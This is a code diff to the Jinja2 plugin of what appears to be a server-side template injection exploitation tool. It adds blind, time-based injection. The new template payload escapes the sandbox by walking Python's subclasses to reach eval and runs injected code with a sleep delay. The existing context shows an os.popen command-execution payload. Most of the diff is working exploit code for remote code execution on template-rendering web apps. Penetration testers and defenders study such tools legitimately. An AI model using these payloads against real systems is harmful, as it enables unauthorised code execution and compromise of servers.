@@ -38,6 +38,20 @@ class Jinja2(Plugin):
         'execute' : {
             'call': 'evaluate',
             'execute': """__import__("os").popen("%(code)s").read()"""
+        },
+        'blind' : {
+            'call': 'blind_evaluate',
+            'bool_true' : """'a'.join('ab') == 'aab'""",
+            'bool_false' : 'True == False'
+        },
+        'blind_evaluate_bool' : {
+            'call': 'inject',
+            'blind_evaluate_bool': """{%% set d = "%(code)s and __import__('time').sleep(%(delay)i)" %%}{%% for c in [].__class__.__base__.__subclasses__() %%} {%% if c.__name__ == 'catch_warnings' %%}
+    {%% for b in c.__init__.func_globals.values() %%} {%% if b.__class__ == {}.__class__ %%}
+    {%% if 'eval' in b.keys() %%}
+    {{ b['eval'](d) }}
+    {%% endif %%} {%% endif %%} {%% endfor %%}
+    {%% endif %%} {%% endfor %%}"""
         }
 
     }
@@ -45,7 +59,7 @@ class Jinja2(Plugin):
     contexts = [
 
         # Text context, no closures
-        { 'level': 1 },
+        { 'level': 0 },
 
         # This covers {{%s}}
         { 'level': 1, 'prefix': '%(closure)s}}', 'suffix' : '', 'closures' : closures.python_ctx_closures },
@@ -82,11 +96,19 @@ class Jinja2(Plugin):
         self.set('os', self.evaluate(payload))
         self.set('eval', 'python')
 
-    def evaluate(self, code):
+    def evaluate(self, code, prefix = '', suffix = '', blind = False):
         # Quote code before submitting it
-        return super(Jinja2, self).evaluate(quote(code))
-
+        return super(Jinja2, self).evaluate(quote(code), prefix, suffix, blind)
 
     def execute(self, code):
         # Quote code before submitting it
         return super(Jinja2, self).execute(quote(code))
+
+    def detect_blind_engine(self):
+
+        if not self.get('blind'):
+            return
+
+        self.set('language', 'python')
+        self.set('engine', 'jinja2')
+        self.set('eval', 'python')
